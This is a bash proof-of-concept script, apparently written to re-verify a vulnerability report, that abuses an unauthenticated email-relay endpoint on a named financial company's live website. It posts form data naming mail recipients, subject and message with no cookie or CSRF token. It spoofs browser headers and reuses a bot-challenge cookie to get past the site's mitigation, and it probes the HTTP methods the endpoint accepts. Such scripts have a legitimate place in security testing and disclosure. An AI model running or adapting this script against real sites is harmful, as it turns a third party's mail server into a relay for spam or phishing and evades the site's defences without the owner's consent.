#!/bin/bash
# Independent re-verification of Infinity Capital POST /api/send unauthenticated email relay
BASE="https://www.infinitycapital.bh"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.5790.98 Safari/537.36"
OUT=/work/evidence/ivrelay_ab12

echo "===== A) GET / ====="
curl -s -D "$OUT/A.hdr" -o "$OUT/A.body" -X GET "${BASE}/" -H "User-Agent: ${UA}" --max-time 25
egrep -i '^(HTTP/|server:|x-vercel-mitigated:|content-type:)' "$OUT/A.hdr"
echo "body(first 200): $(head -c 200 "$OUT/A.body")"
echo

echo "===== B) POST /api/send  full FormData, NO cookie / NO csrf, browser headers ====="
curl -s -D "$OUT/B.hdr" -o "$OUT/B.body" -X POST "${BASE}/api/send" \
  -H "User-Agent: ${UA}" -H "Accept: */*" -H "Accept-Language: en-US,en;q=0.9" \
  -H "Origin: ${BASE}" -H "Referer: ${BASE}/" \
  -H "Sec-Fetch-Dest: empty" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Site: same-origin" \
  -F "targets=relaytest1@" -F "fname=Verify" -F "lname=Bot" -F "cname=QA" \
  -F "subject=Relay check" -F "msg=relay check body" -F "tel=000" -F "check=0" \
  --max-time 25
egrep -i '^(HTTP/|server:|x-vercel-mitigated:|content-type:)' "$OUT/B.hdr"
echo "body(first 500): $(head -c 500 "$OUT/B.body")"
echo

echo "===== C) POST /api/send  same but WITH cookie jar (challenge cookie) ====="
curl -s -c "$OUT/cookies.txt" -o /dev/null "${BASE}/" -H "User-Agent: ${UA}" --max-time 20
curl -s -b "$OUT/cookies.txt" -D "$OUT/C.hdr" -o "$OUT/C.body" -X POST "${BASE}/api/send" \
  -H "User-Agent: ${UA}" -H "Accept: */*" -H "Origin: ${BASE}" -H "Referer: ${BASE}/" \
  -F "targets=relaytest2@" -F "fname=Verify" -F "lname=Bot" -F "cname=QA" \
  -F "subject=Relay check" -F "msg=relay check body" -F "tel=000" -F "check=0" \
  --max-time 25
egrep -i '^(HTTP/|server:|x-vercel-mitigated:|content-type:)' "$OUT/C.hdr"
echo "body(first 500): $(head -c 500 "$OUT/C.body")"
echo

echo "===== D) Other methods on /api/send ====="
for M in GET PUT OPTIONS HEAD; do
  printf "%-8s " "$M"
  curl -s -o /dev/null -w "%{http_code}\n" -X "$M" "${BASE}/api/send" -H "User-Agent: ${UA}" --max-time 20
done
